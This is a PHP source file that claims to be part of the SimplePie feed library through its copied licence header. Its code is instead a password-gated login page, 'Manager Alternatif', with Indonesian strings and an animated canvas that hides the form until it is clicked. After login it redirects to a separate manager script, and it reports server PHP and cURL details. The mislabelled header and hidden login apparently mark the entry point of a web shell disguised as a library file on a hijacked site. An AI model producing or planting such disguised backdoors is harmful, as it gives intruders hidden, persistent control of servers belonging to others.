<?php

/**
 * SimplePie
 *
 * A PHP-Based RSS and Atom Feed Framework.
 * Takes the hard work out of managing a complete RSS/Atom solution.
 *
 * Copyright (c) 2004-2022, Ryan Parman, Sam Sneddon, Ryan McCue, and contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 	* Redistributions of source code must retain the above copyright notice, this list of
 * 	  conditions and the following disclaimer.
 *
 * 	* Redistributions in binary form must reproduce the above copyright notice, this list
 * 	  of conditions and the following disclaimer in the documentation and/or other materials
 * 	  provided with the distribution.
 *
 * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
 * 	  to endorse or promote products derived from this software without specific prior
 * 	  written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
 * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * @package SimplePie
 * @copyright 2004-2016 Ryan Parman, Sam Sneddon, Ryan McCue
 * @author Ryan Parman
 * @author Sam Sneddon
 * @author Ryan McCue
 * @link http://simplepie.org/ SimplePie
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 */
session_start();

require_once __DIR__ . '/add.php';

// Baca ENV
$env = read_env(__DIR__ . '/config/.env');

$NAME = isset($env['META_NAME']) ? $env['META_NAME'] : '';
$VALUE = isset($env['META_DB']) ? $env['META_DB'] : '';

if (!function_exists('password_verify')) {
    require_once __DIR__ . '/assets/form/Verify.php';
}

if (isset($_POST['login'])) {
    if (
        isset($_POST['username']) && isset($_POST['password']) &&
        $_POST['username'] === $NAME &&
        password_verify($_POST['password'], $VALUE)
    ) {
        $_SESSION['logged_in'] = true;
        header("Location: assets/form/App.php");
        exit;
    } else {
        $loginError = "Iya Dikit Lagi Benar! Coba Lagi!!!";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Manager Alternatif</title>
  <style>
    body, html { height: 100%; margin: 0; padding: 0; }
    body { height: 100%; background-color: rgba(25,25,25,1); overflow: hidden; }
    #blackhole { height: 100%; width: 100%; position: relative; display: flex; }
    .centerHover {
      width: 255px; height: 255px; background-color: transparent; border-radius: 50%;
      position: absolute; left: 50%; top: 50%; margin-top: -128px; margin-left: -128px;
      z-index: 2; cursor: pointer; line-height: 255px; text-align: center; transition: all 500ms;
    }
    .centerHover.open { opacity: 0; pointer-events: none; }
    .centerHover span { color: #666; font-family: serif; font-size: 18px; position: relative; transition: all 500ms;}
    .centerHover span:before { margin-right: 12px; }
    .centerHover span:after { margin-left: 12px; }
    .centerHover:hover span { color: #DDD; }
    .centerHover:hover span:before,
    .centerHover:hover span:after { background-color: #DDD; }
    canvas { position: relative; z-index: 1; width: 100%; height: 100%; margin: auto; }
    .login-form-box {
      position: absolute;
      left: 50%; top: 50%; z-index: 10;
      transform: translate(-50%, -50%);
      background: rgba(36,36,36,0.97);
      border-radius: 10px; box-shadow: 0 2px 16px #0007;
      padding: 28px 23px 22px 23px; width: 280px;
      display: none;
      animation: fadeIn 0.7s;
    }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    .login-form-box h2 { color: #eee; margin-bottom: 16px; font-size: 17px; letter-spacing:1px;}
    .login-form-box input[type="text"], .login-form-box input[type="password"] {
      width: 100%; padding: 8px; margin-bottom: 11px;
      border-radius: 5px; border: 1px solid #393939;
      background: #232323; color: #e1e1e1; font-size:13px; outline:none;
      transition: border 0.25s;
    }
    .login-form-box input[type="text"]:focus,
    .login-form-box input[type="password"]:focus { border-color: #83c0f9; }
    .login-form-box button {
      width: 100%; padding: 8px; background: #2980b9;
      color: #fff; border: none; border-radius: 5px; font-size: 14px;
      cursor: pointer; margin-top: 3px;
      transition: background 0.2s;
    }
    .login-form-box button:hover { background: #216494; }
    .alert {
      background: #e74c3c; color: #fff;
      text-align: center; border-radius:5px; margin-bottom:10px; padding: 7px 0 6px 0;
      font-size:13px;
    }
    @media (max-width: 430px) {
      .login-form-box { width:92vw; padding:19px 7vw; }
    }
    .login-form-box form {
    display: flex;
    flex-direction: column;
    gap: 11px;
    }
    .login-form-box input,
    .login-form-box button {
        width: 100%;
        box-sizing: border-box;
    }
  </style>
</head>
<body>
  <div id="blackhole">
    <div class="centerHover" id="showLogin"><span>Hello Abang ⸜(｡˃ ᵕ ˂ )⸝♡</span></div>
    <div class="login-form-box" id="loginBox">
      <h2>Manager Alternatif</h2>
      <?php if (!empty($loginError)) echo '<div class="alert">'.$loginError.'</div>'; ?>
      <form method="post" autocomplete="off">
        <input type="text" name="username" placeholder="Username" autofocus required>
        <input type="password" name="password" placeholder="kuncinya apa?" required>
        <button type="submit" name="login">Login</button>
        <p style="text-align:center; color:#999; font-size:13px; margin-top:10px;">
            Versi PHP saat ini: <?php echo phpversion(); ?><br>
            <?php
                if (function_exists('curl_version')) {
                    echo "cURL Support: <span style='color:#5ec45e'>Aktif</span>";
                } else {
                    echo "cURL Support: <span style='color:#e05c5c'>Tidak Aktif</span>";
                }
            ?>
        </p>
      </form>
    </div>
  </div>
  <script>
    // Blackhole Animation - as provided
    function blackhole(element) {
      const container = document.querySelector(element);
      const h = container.offsetHeight;
      const w = container.offsetWidth;
      const cw = w;
      const ch = h;
      const maxorbit = 255; // distance from center
      const centery = ch / 2;
      const centerx = cw / 2;

      const startTime = new Date().getTime();
      let currentTime = 0;

      const stars = [];
      let collapse = false; // if hovered
      let expanse = false; // if clicked
      let returning = false; // if particles are returning to orbit

      // Create canvas
      const canvas = document.createElement("canvas");
      canvas.width = cw;
      canvas.height = ch;
      container.appendChild(canvas);
      const context = canvas.getContext("2d");
      context.globalCompositeOperation = "multiply";

      function setDPI(canvas, dpi) {
        if (!canvas.style.width) canvas.style.width = canvas.width + "px";
        if (!canvas.style.height) canvas.style.height = canvas.height + "px";
        const scaleFactor = dpi / 96;
        canvas.width = Math.ceil(canvas.width * scaleFactor);
        canvas.height = Math.ceil(canvas.height * scaleFactor);
        const ctx = canvas.getContext("2d");
        ctx.scale(scaleFactor, scaleFactor);
      }

      function rotate(cx, cy, x, y, angle) {
        const radians = angle;
        const cos = Math.cos(radians);
        const sin = Math.sin(radians);
        const nx = cos * (x - cx) + sin * (y - cy) + cx;
        const ny = cos * (y - cy) - sin * (x - cx) + cy;
        return [nx, ny];
      }

      setDPI(canvas, 192);

      class Star {
        constructor() {
          const rands = [];
          rands.push(Math.random() * (maxorbit / 2) + 1);
          rands.push(Math.random() * (maxorbit / 2) + maxorbit);

          this.orbital = rands.reduce((p, c) => p + c, 0) / rands.length;

          this.x = centerx;
          this.y = centery + this.orbital;
          this.yOrigin = centery + this.orbital;

          this.speed = ((Math.floor(Math.random() * 2.5) + 1.5) * Math.PI) / 180;
          this.rotation = 0;
          this.startRotation =
            ((Math.floor(Math.random() * 360) + 1) * Math.PI) / 180;

          this.id = stars.length;

          this.collapseBonus = this.orbital - maxorbit * 0.7;
          if (this.collapseBonus < 0) { this.collapseBonus = 0; }
          this.color = "rgba(255,255,255," + (1 - this.orbital / 255) + ")";
          this.hoverPos = centery + maxorbit / 2 + this.collapseBonus;
          this.expansePos =
            centery + (this.id % 100) * -10 + (Math.floor(Math.random() * 20) + 1);

          this.prevR = this.startRotation;
          this.prevX = this.x;
          this.prevY = this.y;

          this.originalY = this.yOrigin;
          stars.push(this);
        }

        draw() {
          if (!expanse && !returning) {
            this.rotation = this.startRotation + currentTime * this.speed;
            if (!collapse) {
              if (this.y > this.yOrigin) { this.y -= 2.5; }
              if (this.y < this.yOrigin - 4) { this.y += (this.yOrigin - this.y) / 10; }
            } else {
              this.trail = 1;
              if (this.y > this.hoverPos) { this.y -= (this.hoverPos - this.y) / -5; }
              if (this.y < this.hoverPos - 4) { this.y += 2.5; }
            }
          } else if (expanse && !returning) {
            this.rotation = this.startRotation + currentTime * (this.speed / 2);
            if (this.y > this.expansePos) { this.y -= Math.floor(this.expansePos - this.y) / -80; }
          } else if (returning) {
            this.rotation = this.startRotation + currentTime * this.speed;
            if (Math.abs(this.y - this.originalY) > 2) {
              this.y += (this.originalY - this.y) / 50;
            } else {
              this.y = this.originalY;
              this.yOrigin = this.originalY;
            }
          }

          context.save();
          context.fillStyle = this.color;
          context.strokeStyle = this.color;
          context.beginPath();
          const oldPos = rotate(centerx, centery, this.prevX, this.prevY, -this.prevR);
          context.moveTo(oldPos[0], oldPos[1]);
          context.translate(centerx, centery);
          context.rotate(this.rotation);
          context.translate(-centerx, -centery);
          context.lineTo(this.x, this.y);
          context.stroke();
          context.restore();

          this.prevR = this.rotation;
          this.prevX = this.x;
          this.prevY = this.y;
        }
      }

      // Event listeners
      const centerHover = document.querySelector(".centerHover");

      centerHover.addEventListener("click", function () {
        collapse = false;
        expanse = true;
        returning = false;
        this.classList.add("open");
        // Show login box
        document.getElementById('loginBox').style.display = "block";
      });

      centerHover.addEventListener("mouseover", function () {
        if (expanse === false) { collapse = true; }
      });

      centerHover.addEventListener("mouseout", function () {
        if (expanse === false) { collapse = false; }
      });

      // Animation loop
      function loop() {
        const now = new Date().getTime();
        currentTime = (now - startTime) / 50;
        context.fillStyle = "rgba(25,25,25,0.2)";
        context.fillRect(0, 0, cw, ch);

        for (let i = 0; i < stars.length; i++) {
          if (stars[i] !== undefined) { stars[i].draw(); }
        }
        requestAnimationFrame(loop);
      }

      function init() {
        context.fillStyle = "rgba(25,25,25,1)";
        context.fillRect(0, 0, cw, ch);
        for (let i = 0; i < 2500; i++) { new Star(); }
        loop();
      }

      init();
    }

    // Initialize when DOM is loaded
    document.addEventListener("DOMContentLoaded", () => {
      blackhole("#blackhole");
      // Show login if ada error (atau submit)
      <?php if (!empty($loginError)) { ?>
        document.getElementById('loginBox').style.display = "block";
        document.querySelector('.centerHover').classList.add("open");
      <?php } ?>
      // ENTER to focus login form
      document.addEventListener('keydown', function(e) {
        if ((e.key === "Enter" || e.keyCode === 13) && document.getElementById('loginBox').style.display !== "block") {
          document.getElementById('loginBox').style.display = "block";
          document.querySelector('.centerHover').classList.add("open");
        }
      });
    });
  </script>
</body>
</html>
